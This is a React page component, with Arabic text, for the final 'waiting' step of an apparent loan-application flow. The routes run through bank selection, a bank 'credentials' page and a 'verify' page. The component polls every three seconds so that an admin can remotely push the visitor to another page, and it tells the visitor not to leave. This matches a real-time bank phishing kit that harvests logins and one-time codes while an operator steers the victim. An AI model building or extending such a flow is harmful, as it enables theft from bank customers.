// صفحة الانتظار - المرحلة الخامسة والأخيرة للمستخدم
import { useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useGetSession, useGetSiteSettings } from "@workspace/api-client-react";
import { useSession } from "@/context/SessionContext";
import { usePageContent } from "@/hooks/usePageContent";
import StepIndicator from "@/components/StepIndicator";
import Navbar from "@/components/Navbar";
import { Clock, CheckCircle, Building2 } from "lucide-react";

// خريطة التنقل بين الصفحات
const pageRouteMap: Record<string, string> = {
  "home": "/",
  "applicant-info": "/apply",
  "banks": "/apply/banks",
  "credentials": "/apply/credentials",
  "verify": "/apply/verify",
  "waiting": "/apply/waiting",
};

export default function WaitingPage() {
  useLocation();
  const { sessionId } = useSession();
  const { data: settings } = useGetSiteSettings();
  const content = usePageContent("waiting", { page_title: "جاري مراجعة طلبك", page_subtitle: "", message: "" });

  // الاستعلام عن الجلسة كل 3 ثوان للكشف عن تحديثات المدير
  const { data: session } = useGetSession(sessionId!, {
    query: {
      enabled: !!sessionId,
      refetchInterval: 3000,
    }
  });

  // مراقبة تغيير الصفحة من المدير عبر polling (احتياطي إضافي لـ WebSocket في SessionContext)
  const prevPageRef = useRef("waiting");
  useEffect(() => {
    if (!session) return;
    const currentPage = session.currentPage;
    if (currentPage !== "waiting" && currentPage !== prevPageRef.current) {
      const route = pageRouteMap[currentPage] || "/apply";
      // إعادة تحميل كاملة
      window.location.href = route;
    }
    prevPageRef.current = currentPage;
  }, [session?.currentPage]);

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <Navbar />
      <StepIndicator currentStep={5} />

      <div className="container mx-auto px-4 py-16 max-w-lg text-center">
        {/* مؤشر التحميل المتحرك */}
        <div className="relative w-28 h-28 mx-auto mb-8">
          <div className="absolute inset-0 rounded-full border-4 border-muted" />
          <div className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin" />
          <div className="absolute inset-4 navy-gradient rounded-full flex items-center justify-center">
            <Building2 className="w-8 h-8 text-white" />
          </div>
        </div>

        <h1 className="text-3xl font-black mb-4" style={{ color: content.title_color || "var(--color-primary)" }}>
          {content.page_title || "جاري مراجعة طلبك"}
        </h1>
        <p className="text-lg mb-8 leading-relaxed text-muted-foreground" style={content.text_color ? { color: content.text_color } : {}}>
          {content.message || settings?.waitingPageMessage || "يرجى الانتظار بينما يقوم فريقنا بمراجعة طلبكم. سيتم التواصل معكم قريباً."}
        </p>

        {/* تعليمات للمستخدم */}
        <div className="bg-card border rounded-2xl p-6 text-right space-y-4">
          <h3 className="font-bold text-foreground text-center mb-4">تعليمات مهمة</h3>
          {[
            "يرجى البقاء في هذه الصفحة حتى اكتمال المراجعة",
            "سيتم إشعارك فور اتخاذ قرار بشأن طلبك",
            "مدة المراجعة لا تتجاوز 24 ساعة عمل",
            "في حالة وجود استفسار، تواصل معنا عبر الأرقام الموضحة",
          ].map((item, i) => (
            <div key={i} className="flex items-start gap-3">
              <CheckCircle className="w-5 h-5 text-green-500 shrink-0 mt-0.5" />
              <span className="text-muted-foreground text-sm">{item}</span>
            </div>
          ))}
        </div>

        <div className="mt-8 flex items-center justify-center gap-2 text-muted-foreground text-sm">
          <Clock className="w-4 h-4" />
          <span>جاري التحقق من حالة طلبك...</span>
        </div>
      </div>
    </div>
  );
}
